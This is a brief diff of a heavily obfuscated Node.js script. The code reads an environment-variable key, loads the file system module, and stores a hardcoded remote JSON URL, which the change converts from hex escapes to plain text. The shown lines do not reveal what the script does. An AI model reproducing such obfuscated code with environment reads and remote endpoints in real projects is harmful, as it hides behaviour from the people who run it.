@@ -31,7 +31,7 @@ let acckey = $$[IM(0xc11)]() ? process[IM(0x89c)][IM(0x9e4)] ? process[IM(0x89c)
     all_msg = '',
     mac = '';
 $$[IM(0xc11)]() ? (gtr = require('fs'), isFileExist(IM(0xb1d)) ? console['log'](IM(0x4c1)) : console[IM(0x75b)](IM(0xa3b))) : console[IM(0x75b)](IM(0x95d));
-let res2 = '\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x73\x73\x2e\x65\x6c\x63\x66\x71\x2e\x63\x6f\x6d\x2f\x31\x32\x33\x2e\x6a\x73\x6f\x6e';
+let res2 = 'http://kss.elcfq.com/123.json';
 
 function isFileExist(T) {
     const Id = IM,
